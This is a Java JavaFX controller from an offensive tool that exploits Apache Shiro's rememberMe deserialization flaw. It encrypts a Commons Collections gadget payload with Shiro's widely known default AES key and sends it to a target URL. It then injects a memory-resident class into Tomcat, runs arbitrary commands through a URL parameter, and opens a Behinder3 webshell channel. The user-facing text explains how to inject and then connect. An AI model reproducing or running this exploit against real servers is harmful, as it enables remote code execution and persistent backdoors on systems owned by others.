package ccdr4gon;



import ccdr4gon.utils.HttpUtil;
import javafx.collections.FXCollections;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import net.bytebuddy.ByteBuddy;
import org.apache.commons.lang3.StringUtils;
import org.apache.shiro.crypto.AesCipherService;
import javafx.fxml.Initializable;
import org.apache.shiro.util.ByteSource;



import java.net.URL;
import java.util.Base64;
import java.util.ResourceBundle;


public class Controller implements Initializable {

    @FXML
    public TextField ShiroURLField;
    @FXML
    public Button ShiroExecuteButton;
    @FXML
    public Button ShiroInjectButton;
    @FXML
    public ChoiceBox ShiroMiddlewareBox;
    @FXML
    public ChoiceBox ShiroWebShellManagerBox;
    @FXML
    public TextField ShiroCommandField;
    @FXML
    public TextArea ShiroTextArea;
    @FXML
    public TextField ShiroKeyField;
    @FXML
    public CheckBox ShiroGBK;


    public void ShiroExecuteHandler(ActionEvent event){
            String url=ShiroURLField.getText();
            String excuteurl;
            String cmd=ShiroCommandField.getText();
            Boolean gbk=ShiroGBK.isSelected();
            if(gbk){
                excuteurl=url+"&stage=echo&gbk=true&cmd="+cmd;
            }else {
                excuteurl=url+"&stage=echo&gbk=false&cmd="+cmd;
            }
            if (!excuteurl.contains("?"))
            excuteurl=excuteurl.replaceFirst("&","?");
            try {
                byte[] res_bytes=HttpUtil.get(excuteurl,"");
                String res;
                if(gbk){
                res=new String(res_bytes,"GBK");
                }
                else {
                    res=new String(res_bytes);
                }
                res=StringUtils.substringBefore(res,"=========end=========");
                ShiroTextArea.appendText(res);
            }catch (Exception e){
                e.printStackTrace();
            }
    }

    public void ShiroInjectHandler(ActionEvent event) {
        try {
            //get input
            byte[] key =java.util.Base64.getDecoder().decode(ShiroKeyField.getText());
            String url=ShiroURLField.getText();
            //generate payload
            byte[] init= new CommonsCollectionsK1_1().getPayload();
            AesCipherService aes = new AesCipherService();
            ByteSource ciphertext = aes.encrypt(init, key);
            String initPayload="rememberMe="+ciphertext.toString();

            byte[] load= new ByteBuddy()
                    .redefine(Load.class)
                    .name("Load")
                    .make()
                    .getBytes();
            String loadPayload= Base64.getEncoder().encodeToString(load);

            //inject
            String loadurl;
            HttpUtil.get(url,initPayload);

            if(url.contains("?")){
                loadurl=url+"&stage=init";
            }else {
                loadurl=url+"?stage=init";
            }
            HttpUtil.post(loadurl,"",loadPayload);
            ShiroTextArea.appendText("注入完成\n");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void initialize (URL url, ResourceBundle rb)
    {
        ShiroWebShellManagerBox.setItems(FXCollections.observableArrayList("Behinder3"));
        ShiroMiddlewareBox.setItems(FXCollections.observableArrayList("Tomcat"));

        //default value
        ShiroKeyField.appendText("kPH+bIxk5D2deZiIxcaaaA==");
        ShiroWebShellManagerBox.setValue("Behinder3");
        ShiroMiddlewareBox.setValue("Tomcat");

        //绑定事件
        ShiroInjectButton.setOnAction(this::ShiroInjectHandler);
        ShiroExecuteButton.setOnAction(this::ShiroExecuteHandler);

        ShiroTextArea.appendText("ccdr4gon's Sword 0.0.1 --- 百废待兴的简陋版本\n");
        ShiroTextArea.appendText("Tomcat包括SpringBoot的嵌入式Tomcat(默认Web容器),直接使用即可\n");
        ShiroTextArea.appendText("使用方法:先点击Inject注入，然后可以执行命令，并且此Tomcat解析的任何非404路径都可以连接冰蝎3\n");
    }





}
